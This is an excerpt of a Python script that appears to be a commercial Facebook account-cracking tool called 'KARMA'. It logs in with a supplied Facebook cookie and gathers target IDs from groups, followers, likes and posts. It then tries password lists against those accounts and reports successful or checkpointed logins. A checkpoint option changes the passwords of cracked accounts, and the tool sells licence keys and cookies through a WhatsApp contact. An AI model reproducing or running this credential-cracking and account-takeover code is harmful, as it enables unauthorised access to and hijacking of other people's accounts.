...
def xoshnaw():
  ...
  try:
    httpCaht = requests.get("https://raw.githubusercontent.com/Jenny-khan/Dharma/main/darma.txt").text
    if id in httpCaht:
...
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        ...
        cek_cp = input(f"\n [{O}?{N}] BRING UP CHECKPOINT DETECTOR OPTION [Y/t]: ")
        if cek_cp =="":
            print(f"\n [{M}!{N}] DONT EMPTY");hasil(ok,cp)
        elif cek_cp in["Y","y"]:
            jalan(f" [{M}!{N}] TURN ON AIRPLANE MODE FOR 3 SEC.");time.sleep(5)
            ww=input(f"\n [{O}?{N}] CHANGE PASSWORD WHEN TAP YES [Y/t]: ")
            if ww in ("Y","y","ya"):
                ubahP.append("y")
                print(f" [{H}•{N}] EXAMPLE PASSWORD : {H}Karma{N}")
                pwBar=input(f"\n [{H}+{N}] ENTER NEW PASSWORD : ")
                print("\n")
                if len(pwBar) <= 5:
                    print('\n %s[%s×%s] kata PASSWORD AT LEAST SIX CHARACTERS'%(N,M,N))
                else:
                    pwBaru.append(pwBar)
            for memek in cp:
...
def yayanxd():
    os.system('clear')
    print (' %s*%s THIS TOOL USES COOKIE TO LOGIN \n %s*%s HOW TO GET FACEBOOK COOKIE?\n %s*%s TYPE OPEN TO BUY COOKIE'%(O,N,O,N,O,N))
    cookie = input("\n %s[%s?%s] Cookies : %s"% (N,K,N,O))
    if cookie in['OPEN','Open','open']:
      jalan("\n  %s* %sMESSAGE ADMIN"%(O,H));time.sleep(3);os.system('xdg-open https://wa.me/+2348110044418');yayanxd()
    try:
        head={'Host':'business.facebook.com','cache-control':'max-age=0','upgrade-insecure-requests':'1','user-agent':'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0','accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','content-type' : 'text/html; charset=utf-8','accept-encoding':'gzip, deflate br','accept-language':'en-GB,en-US;q=0.9,en;q=0.8,en;q=0.7','cookie': cookie}
        ...
        print(' %s*%s PLEASE USE THIS TOOL WISELY .WE ARE NOT RESPONSIBLE IF MISUSED ONWER KARMA DAVID...'%(O,N));time.sleep(2)
        input(' %s*%s tekan enter '%(O,H))
        os.system('xdg-open https://wa.me/+2348110044418')
        moch_yayan()
    except AttributeError:
        print('\n %s[%s×%s] MF COOKIE INVALID'%(N,M,N));time.sleep(1);yayanxd()
...
def moch_yayan():
    ...
    try:
        ...
        tod = req['pay_key'].replace("Premium", "\x1b[1;92mACTIVATED\x1b[0m").replace("Trial", "\x1b[1;91mTidak\x1b[0m")
        todz = req['pay_key']
        notice = req['text']
        statuz = req["status"]
    ...
    print(f" [*] JOIN       : {bergabung}");time.sleep(0.03)
    ...
    kueh  = {"cookie":cookiz}
    print(" [ WELCOME %s%s%s ]\n"%(U,nama,P));time.sleep(0.03)
    print(' [%s01%s]. KARMA FROM GROUP'%(U,P));time.sleep(0.03)
    print(' [%s02%s]. KARMA FROM PUBLIC'%(O,N));time.sleep(0.03)
    print(' [%s03%s]. KARMA FROM FOLLOWERS'%(U,P));time.sleep(0.03)
    print(' [%s04%s]. KARMA FROM LIKES'%(O,N));time.sleep(0.03)
    print(' [%s05%s]. KARMA FROM MULTI CRACK'%(U,P));time.sleep(0.03)
    print(' [%s06%s]. KARMA FROM POST'%(O,N));time.sleep(0.03)
    print(' [%s07%s]. KARMA CHECKPOINT DETECT'%(U,P));time.sleep(0.03)
    print(' [%s08%s]. KARMA USERAGENT'%(O,N));time.sleep(0.03)
    print(' [%s09%s]. KARMA CHECK CRACK RESULT'%(U,P));time.sleep(0.03)
    print(' [%s10%s]. KARMA UPGRADE %s premium%s'%(O,N,O,N));time.sleep(0.03)
    print(' [%s00%s]. LOGOUT (%sLogout cookie%s)'%(U,P,U,P));time.sleep(0.03)
    pepek = input('\n [%s*%s] MENU : '%(O,N))
    if pepek == '':
        ...
        if upd =="":
            ...
            os.system('xdg-open https://wa.me/+2348110044418?text=RATU+ERROR+BELI+LISENSINYA+DOOONG...........???');time.sleep(2);exit()
        elif upd in["T","t"]:
...
def register():
    ...
    if upd =="":
        ...
        os.system('xdg-open https://wa.me/+2348110044418?text=RATU+ERROR+BELI+LISENSINYA+DOOONG...........???');register()
    elif upd in["T","t"]:
        jalan(f"{B} >> Good byee:)");exit()
    else:
        print(f"{N}[{M}×{N}] Y/t memek!");time.sleep(2);register()
...
def cok():
    ...
    print("[*] MESSAGE ADMIN FOR COOKIE (%sKARMA%s)"%(H,N))
    print("[*] IF YOU DO NOT UNDERSTAND USING THE TOOLS, PLEASE CONTACT THE ADMIN BY TYping'%sADMIN%s'"%(H,N))
    print("[*] OWNER KARMA DAVID %sTRIAL%s PLEASE PURCHASE LINCES KEY (%s1 day%s)"%(H,N,H,N))
    ...
    if key == '':
        ...
        os.system('xdg-open https://wa.me/+2348110044418?text=RATU+ERROR+BELI+LISENSINYA+DOOONG...........???');time.sleep(2);cok()
    ...
    try:
        ...
        jalan(f"\n[{H}•{N}] Hallo {H}{user}{N} your apikey is still valid till date: {M}{kadaluarsa}{N}, silahkan gunakan dengan bijak.");time.sleep(2)
        exit("[%s!%s] rerun the command by typing python demon.py"%(M,N))
    except KeyError:
...
class __crack__:
    ...
    def plerr(self,id):
        ...
        if ___yayanganteng___ in ('Y', 'y'):
            ...
            print(' [%s2%s]. METHOD MOBILE (FAST)'%(U,P))
    ...
    def __api__(self, user, __yan__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write(f'\r [*] [crack] {loop}/{len(self.id)} ->KARMA-OK-:{len(ok)} - CP-:{len(ok)} '),
            sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
    ...
    def __metode__(self, user, __yan__, cebok):
        global ok,cp,loop
        sys.stdout.write(f'\r [*] [crack] {loop}/{len(self.id)} ->KARMA-OK-:{len(ok)} - CP-:{len(cp)} '),
        sys.stdout.flush()
        try:
            for pw in __yan__:
                pw = pw.lower()
